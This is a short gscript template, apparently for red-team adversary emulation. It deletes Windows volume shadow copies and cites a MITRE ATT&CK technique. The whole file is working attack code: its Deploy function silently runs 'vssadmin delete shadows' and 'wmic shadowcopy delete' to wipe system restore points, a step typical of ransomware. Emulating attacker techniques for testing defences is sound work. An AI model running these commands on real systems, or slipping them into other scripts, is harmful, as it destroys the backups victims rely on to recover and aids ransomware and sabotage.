// Example gscript template
// Title: Delete Volume Shadow Copy
// Author: ahhh
// Purpose: Deletes the volume shadow copy with both wmic and vssadmin
// Gscript version: 0.1.1
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1107

//priority:100
//timeout:150

var fn;

function BeforeDeploy() {
  LogInfo("starting execution of Delete Volume Shadow Copy");
  return true; 
}

function Deploy() {  
  // Delete the volume shadow copy with the vssadmin tool
  ForkExecuteCommand("vssadmin.exe", ["delete", "shadows", "/for=c:", "/oldest", "/quiet"]);
  LogInfo("Deleted the volume shadow copy with the vssadmin tool");

  // Delete the volume shadow copy with wmic
  ForkExecuteCommand("wmic.exe", ["shadowcopy", "delete", "/nointeractive"]);
  LogInfo("Deleted the volume shadow copy with wmic");

  return true;
}

function AfterDeploy() {
  LogInfo("done Deleting VSC");
  return true;
}